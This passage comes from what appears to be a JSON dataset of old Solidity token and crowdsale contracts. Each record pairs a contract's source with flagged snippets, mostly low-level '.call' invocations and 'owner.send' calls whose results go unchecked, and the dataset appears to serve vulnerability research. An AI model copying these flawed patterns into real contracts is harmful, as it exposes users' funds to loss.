decimals = 18;\n symbol = \"CRYPT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15f0"
  },
  "filename": "36494.sol",
  "content": "pragma solidity ^0.4.16;\n contract CentraSale {\n using SafeMath for uint;\n address public contract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;\n address public owner;\n uint public constant min_value = 10**18*1/10;\n uint256 public constant token_price = 1481481481481481;\n uint256 public tokens_total;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n throw;\n }\n _;\n }\n function CentraSale() {\n owner = msg.sender;\n }\n function() payable {\n if(!(msg.value >= min_value)) throw;\n tokens_total = msg.value*10**18/token_price;\n if(!(tokens_total > 0)) throw;\n if(!contract_transfer(tokens_total)) throw;\n owner.send(this.balance);\n }\n function contract_transfer(uint _amount) private returns (bool) {\n if(!contract_address.call(bytes4(sha3(\"transfer(address,uint256)\")),msg.sender,_amount)) {\n return false;\n }\n return true;\n }\n function withdraw() onlyOwner returns (bool result) {\n owner.send(this.balance);\n return true;\n }\n }\n library SafeMath {\n function mul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint a, uint b) internal returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n function assert(bool assertion) internal {\n if (!assertion) {\n throw;\n }\n }\n }",
  "extract_feature": [
    "function contract_transfer(uint _amount) private returns (bool) {\nif(!contract_address.call(bytes4(sha3(\"transfer(address,uint256)\")),msg.sender,_amount)) {\nreturn false;\n}\nreturn true;\n}",
    "function withdraw() onlyOwner returns (bool result) {\nowner.send(this.balance);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15f1"
  },
  "filename": "36495.sol",
  "content": "pragma solidity ^0.4.16;\n contract CentraSale {\n using SafeMath for uint;\n address public contract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;\n address public owner;\n uint public cap;\n uint public constant cap_max = 170000*10**18;\n uint public constant min_value = 10**18*1/10;\n uint public operation;\n mapping(uint => address) public operation_address;\n mapping(uint => uint) public operation_amount;\n uint256 public constant token_price = 10**18*1/200;\n uint256 public tokens_total;\n uint public constant contract_start = 1505844000;\n uint public constant contract_finish = 1507269600;\n uint public constant card_titanium_minamount = 500*10**18;\n uint public constant card_titanium_first = 200000;\n mapping(address => uint) cards_titanium_check;\n address[] public cards_titanium;\n uint public constant card_black_minamount = 100*10**18;\n uint public constant card_black_first = 500000;\n mapping(address => uint) public cards_black_check;\n address[] public cards_black;\n uint public constant card_metal_minamount = 40*10**18;\n uint public constant card_metal_first = 750000;\n mapping(address => uint) cards_metal_check;\n address[] public cards_metal;\n uint public constant card_gold_minamount = 30*10**18;\n uint public constant card_gold_first = 1000000;\n mapping(address => uint) cards_gold_check;\n address[] public cards_gold;\n uint public constant card_blue_minamount = 5/10*10**18;\n uint public constant card_blue_first = 100000000;\n mapping(address => uint) cards_blue_check;\n address[] public cards_blue;\n uint public constant card_start_minamount = 1/10*10**18;\n uint public constant card_start_first = 100000000;\n mapping(address => uint) cards_start_check;\n address[] public cards_start;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n throw;\n }\n _;\n }\n function CentraSale() {\n owner = msg.sender;\n operation = 0;\n cap = 0;\n }\n function() payable {\n if(!(msg.value >= min_value)) throw;\n if(now < contract_start) throw;\n if(now > contract_finish) throw;\n tokens_total = msg.value*10**18/token_price;\n if(!(tokens_total > 0)) throw;\n if(!contract_transfer(tokens_total)) throw;\n cap = cap.add(msg.value);\n operations();\n get_card();\n owner.send(this.balance);\n }\n function contract_transfer(uint _amount) private returns (bool) {\n if(!contract_address.call(bytes4(sha3(\"transfer(address,uint256)\")),msg.sender,_amount)) {\n return false;\n }\n return true;\n }\n function operations() private returns (bool) {\n operation_address[operation] = msg.sender;\n operation_amount[operation] = msg.value;\n operation = operation.add(1);\n return true;\n }\n function withdraw() onlyOwner returns (bool result) {\n owner.send(this.balance);\n return true;\n }\n function cards_titanium_total() constant returns (uint) {\n return cards_titanium.length;\n }\n function cards_black_total() constant returns (uint) {\n return cards_black.length;\n }\n function cards_metal_total() constant returns (uint) {\n return cards_metal.length;\n }\n function cards_gold_total() constant returns (uint) {\n return cards_gold.length;\n }\n function cards_blue_total() constant returns (uint) {\n return cards_blue.length;\n }\n function cards_start_total() constant returns (uint) {\n return cards_start.length;\n }\n function get_card() private returns (bool) {\n if((msg.value >= card_titanium_minamount)\n &&(cards_titanium.length < card_titanium_first)\n &&(cards_titanium_check[msg.sender] != 1)\n ) {\n cards_titanium.push(msg.sender);\n cards_titanium_check[msg.sender] = 1;\n }\n if((msg.value >= card_black_minamount)\n &&(msg.value < card_titanium_minamount)\n &&(cards_black.length < card_black_first)\n &&(cards_black_check[msg.sender] != 1)\n ) {\n cards_black.push(msg.sender);\n cards_black_check[msg.sender] = 1;\n }\n if((msg.value >= card_metal_minamount)\n &&(msg.value < card_black_minamount)\n &&(cards_metal.length < card_metal_first)\n &&(cards_metal_check[msg.sender] != 1)\n ) {\n cards_metal.push(msg.sender);\n cards_metal_check[msg.sender] = 1;\n }\n if((msg.value >= card_gold_minamount)\n &&(msg.value < card_metal_minamount)\n &&(cards_gold.length < card_gold_first)\n &&(cards_gold_check[msg.sender] != 1)\n ) {\n cards_gold.push(msg.sender);\n cards_gold_check[msg.sender] = 1;\n }\n if((msg.value >= card_blue_minamount)\n &&(msg.value < card_gold_minamount)\n &&(cards_blue.length < card_blue_first)\n &&(cards_blue_check[msg.sender] != 1)\n ) {\n cards_blue.push(msg.sender);\n cards_blue_check[msg.sender] = 1;\n }\n if((msg.value >= card_start_minamount)\n &&(msg.value < card_blue_minamount)\n &&(cards_start.length < card_start_first)\n &&(cards_start_check[msg.sender] != 1)\n ) {\n cards_start.push(msg.sender);\n cards_start_check[msg.sender] = 1;\n }\n return true;\n }\n }\n library SafeMath {\n function mul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint a, uint b) internal returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n function assert(bool assertion) internal {\n if (!assertion) {\n throw;\n }\n }\n }",
  "extract_feature": [
    "function contract_transfer(uint _amount) private returns (bool) {\nif(!contract_address.call(bytes4(sha3(\"transfer(address,uint256)\")),msg.sender,_amount)) {\nreturn false;\n}\nreturn true;\n}",
    "function withdraw() onlyOwner returns (bool result) {\nowner.send(this.balance);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15f2"
  },
  "filename": "36496.sol",
  "content": "pragma solidity ^0.4.16;\n contract CentraSale {\n using SafeMath for uint;\n address public contract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;\n address public owner;\n uint public cap;\n uint public constant cap_max = 170000*10**18;\n uint public constant min_value = 10**18*1/10;\n uint public operation;\n mapping(uint => address) public operation_address;\n mapping(uint => uint) public operation_amount;\n uint256 public constant token_price = 1481481481481481;\n uint256 public tokens_total;\n uint public constant contract_start = 1505844000;\n uint public constant contract_finish = 1507269600;\n uint public constant card_titanium_minamount = 500*10**18;\n uint public constant card_titanium_first = 200000;\n mapping(address => uint) cards_titanium_check;\n address[] public cards_titanium;\n uint public constant card_black_minamount = 100*10**18;\n uint public constant card_black_first = 500000;\n mapping(address => uint) public cards_black_check;\n address[] public cards_black;\n uint public constant card_metal_minamount = 40*10**18;\n uint public constant card_metal_first = 750000;\n mapping(address => uint) cards_metal_check;\n address[] public cards_metal;\n uint public constant card_gold_minamount = 30*10**18;\n uint public constant card_gold_first = 1000000;\n mapping(address => uint) cards_gold_check;\n address[] public cards_gold;\n uint public constant card_blue_minamount = 5/10*10**18;\n uint public constant card_blue_first = 100000000;\n mapping(address => uint) cards_blue_check;\n address[] public cards_blue;\n uint public constant card_start_minamount = 1/10*10**18;\n uint public constant card_start_first = 100000000;\n mapping(address => uint) cards_start_check;\n address[] public cards_start;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n throw;\n }\n _;\n }\n function CentraSale() {\n owner = msg.sender;\n operation = 0;\n cap = 0;\n }\n function() payable {\n if(!(msg.value >= min_value)) throw;\n if(now < contract_start) throw;\n if(now > contract_finish) throw;\n tokens_total = msg.value*10**18/token_price;\n if(!(tokens_total > 0)) throw;\n if(!contract_transfer(tokens_total)) throw;\n cap = cap.add(msg.value);\n operations();\n get_card();\n owner.send(this.balance);\n }\n function contract_transfer(uint _amount) private returns (bool) {\n if(!contract_address.call(bytes4(sha3(\"transfer(address,uint256)\")),msg.sender,_amount)) {\n return false;\n }\n return true;\n }\n function operations() private returns (bool) {\n operation_address[operation] = msg.sender;\n operation_amount[operation] = msg.value;\n operation = operation.add(1);\n return true;\n }\n function withdraw() onlyOwner returns (bool result) {\n owner.send(this.balance);\n return true;\n }\n function cards_titanium_total() constant returns (uint) {\n return cards_titanium.length;\n }\n function cards_black_total() constant returns (uint) {\n return cards_black.length;\n }\n function cards_metal_total() constant returns (uint) {\n return cards_metal.length;\n }\n function cards_gold_total() constant returns (uint) {\n return cards_gold.length;\n }\n function cards_blue_total() constant returns (uint) {\n return cards_blue.length;\n }\n function cards_start_total() constant returns (uint) {\n return cards_start.length;\n }\n function get_card() private returns (bool) {\n if((msg.value >= card_titanium_minamount)\n &&(cards_titanium.length < card_titanium_first)\n &&(cards_titanium_check[msg.sender] != 1)\n ) {\n cards_titanium.push(msg.sender);\n cards_titanium_check[msg.sender] = 1;\n }\n if((msg.value >= card_black_minamount)\n &&(msg.value < card_titanium_minamount)\n &&(cards_black.length < card_black_first)\n &&(cards_black_check[msg.sender] != 1)\n ) {\n cards_black.push(msg.sender);\n cards_black_check[msg.sender] = 1;\n }\n if((msg.value >= card_metal_minamount)\n &&(msg.value < card_black_minamount)\n &&(cards_metal.length < card_metal_first)\n &&(cards_metal_check[msg.sender] != 1)\n ) {\n cards_metal.push(msg.sender);\n cards_metal_check[msg.sender] = 1;\n }\n if((msg.value >= card_gold_minamount)\n &&(msg.value < card_metal_minamount)\n &&(cards_gold.length < card_gold_first)\n &&(cards_gold_check[msg.sender] != 1)\n ) {\n cards_gold.push(msg.sender);\n cards_gold_check[msg.sender] = 1;\n }\n if((msg.value >= card_blue_minamount)\n &&(msg.value < card_gold_minamount)\n &&(cards_blue.length < card_blue_first)\n &&(cards_blue_check[msg.sender] != 1)\n ) {\n cards_blue.push(msg.sender);\n cards_blue_check[msg.sender] = 1;\n }\n if((msg.value >= card_start_minamount)\n &&(msg.value < card_blue_minamount)\n &&(cards_start.length < card_start_first)\n &&(cards_start_check[msg.sender] != 1)\n ) {\n cards_start.push(msg.sender);\n cards_start_check[msg.sender] = 1;\n }\n return true;\n }\n }\n library SafeMath {\n function mul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint a, uint b) internal returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n function assert(bool assertion) internal {\n if (!assertion) {\n throw;\n }\n }\n }",
  "extract_feature": [
    "function contract_transfer(uint _amount) private returns (bool) {\nif(!contract_address.call(bytes4(sha3(\"transfer(address,uint256)\")),msg.sender,_amount)) {\nreturn false;\n}\nreturn true;\n}",
    "function withdraw() onlyOwner returns (bool result) {\nowner.send(this.balance);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15f3"
  },
  "filename": "36517.sol",
  "content": "pragma solidity ^0.4.13;\n contract CentraSale {\n using SafeMath for uint;\n address public contract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;\n address public owner;\n uint public cap;\n uint public constant cap_max = 170000*10**18;\n uint public constant min_value = 10**18*1/10;\n uint public operation;\n mapping(uint => address) public operation_address;\n mapping(uint => uint) public operation_amount;\n uint256 public constant token_price = 10**18*1/250;\n uint256 public tokens_total;\n uint public constant contract_start = 1505844000;\n uint public constant contract_finish = 1507269600;\n uint public constant card_titanium_minamount = 500*10**18;\n uint public constant card_titanium_first = 200;\n mapping(address => uint) cards_titanium_check;\n address[] public cards_titanium;\n uint public constant card_black_minamount = 100*10**18;\n uint public constant card_black_first = 500;\n mapping(address => uint) public cards_black_check;\n address[] public cards_black;\n uint public constant card_metal_minamount = 40*10**18;\n uint public constant card_metal_first = 750;\n mapping(address => uint) cards_metal_check;\n address[] public cards_metal;\n uint public constant card_gold_minamount = 30*10**18;\n uint public constant card_gold_first = 1000;\n mapping(address => uint) cards_gold_check;\n address[] public cards_gold;\n uint public constant card_blue_minamount = 5/10*10**18;\n uint public constant card_blue_first = 100000000;\n mapping(address => uint) cards_blue_check;\n address[] public cards_blue;\n uint public constant card_start_minamount = 1/10*10**18;\n uint public constant card_start_first = 100000000;\n mapping(address => uint) cards_start_check;\n address[] public cards_start;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n throw;\n }\n _;\n }\n function CentraSale() {\n owner = msg.sender;\n operation = 0;\n cap = 0;\n }\n function() payable {\n if(!(msg.value >= min_value)) throw;\n if(now < contract_start) throw;\n if(now > contract_finish) throw;\n if(cap + msg.value > cap_max) throw;\n tokens_total = msg.value*10**18/token_price;\n if(!(tokens_total > 0)) throw;\n if(!contract_transfer(tokens_total)) throw;\n cap = cap.add(msg.value);\n operations();\n get_card();\n owner.send(this.balance);\n }\n function contract_transfer(uint _amount) private returns (bool) {\n if(!contract_address.call(bytes4(sha3(\"transfer(address,uint256)\")),msg.sender,_amount)) {\n return false;\n }\n return true;\n }\n function operations() private returns (bool) {\n operation_address[operation] = msg.sender;\n operation_amount[operation] = msg.value;\n operation = operation.add(1);\n return true;\n }\n function withdraw() onlyOwner returns (bool result) {\n owner.send(this.balance);\n return true;\n }\n function cards_titanium_total() constant returns (uint) {\n return cards_titanium.length;\n }\n function cards_black_total() constant returns (uint) {\n return cards_black.length;\n }\n function cards_metal_total() constant returns (uint) {\n return cards_metal.length;\n }\n function cards_gold_total() constant returns (uint) {\n return cards_gold.length;\n }\n function cards_blue_total() constant returns (uint) {\n return cards_blue.length;\n }\n function cards_start_total() constant returns (uint) {\n return cards_start.length;\n }\n function get_card() private returns (bool) {\n if((msg.value >= card_titanium_minamount)\n &&(cards_titanium.length < card_titanium_first)\n &&(cards_titanium_check[msg.sender] != 1)\n ) {\n cards_titanium.push(msg.sender);\n cards_titanium_check[msg.sender] = 1;\n }\n if((msg.value >= card_black_minamount)\n &&(msg.value < card_titanium_minamount)\n &&(cards_black.length < card_black_first)\n &&(cards_black_check[msg.sender] != 1)\n ) {\n cards_black.push(msg.sender);\n cards_black_check[msg.sender] = 1;\n }\n if((msg.value >= card_metal_minamount)\n &&(msg.value < card_black_minamount)\n &&(cards_metal.length < card_metal_first)\n &&(cards_metal_check[msg.sender] != 1)\n ) {\n cards_metal.push(msg.sender);\n cards_metal_check[msg.sender] = 1;\n }\n if((msg.value >= card_gold_minamount)\n &&(msg.value < card_metal_minamount)\n &&(cards_gold.length < card_gold_first)\n &&(cards_gold_check[msg.sender] != 1)\n ) {\n cards_gold.push(msg.sender);\n cards_gold_check[msg.sender] = 1;\n }\n if((msg.value >= card_blue_minamount)\n &&(msg.value < card_gold_minamount)\n &&(cards_blue.length < card_blue_first)\n &&(cards_blue_check[msg.sender] != 1)\n ) {\n cards_blue.push(msg.sender);\n cards_blue_check[msg.sender] = 1;\n }\n if((msg.value >= card_start_minamount)\n &&(msg.value < card_blue_minamount)\n &&(cards_start.length < card_start_first)\n &&(cards_start_check[msg.sender] != 1)\n ) {\n cards_start.push(msg.sender);\n cards_start_check[msg.sender] = 1;\n }\n return true;\n }\n }\n library SafeMath {\n function mul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint a, uint b) internal returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n function assert(bool assertion) internal {\n if (!assertion) {\n throw;\n }\n }\n }",
  "extract_feature": [
    "function contract_transfer(uint _amount) private returns (bool) {\nif(!contract_address.call(bytes4(sha3(\"transfer(address,uint256)\")),msg.sender,_amount)) {\nreturn false;\n}\nreturn true;\n}",
    "function withdraw() onlyOwner returns (bool result) {\nowner.send(this.balance);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15f4"
  },
  "filename": "36532.sol",
  "content": "pragma solidity ^0.4.4;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n using SafeMath for uint256;\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Crypterium is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = \"1.0\";\n function Crypterium(\n ) {\n balances[msg.sender] = 10000000000000000;\n totalSupply = 10000000000000000;\n name = \"Crypterium\";\n decimals = 8;\n symbol = \"CRYPT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15f5"
  },
  "filename": "36664.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n revert();\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = \"H 2.0\";\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\ncontract BOBOv2 is HumanStandardToken(2100000000000000, \"BOBOv2\", 8, \"BB2\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15f6"
  },
  "filename": "36690.sol",
  "content": "pragma solidity ^0.4.4;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n using SafeMath for uint256;\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Crypterium is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Crypterium(\n ) {\n balances[msg.sender] = 10000000000000000000000000;\n totalSupply = 10000000000000000000000000;\n name = \"Crypterium\";\n decimals = 18;\n symbol = \"CRPT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15f7"
  },
  "filename": "36714.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract RepuToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function RepuToken(\n ) {\n balances[msg.sender] = 1000000;\n 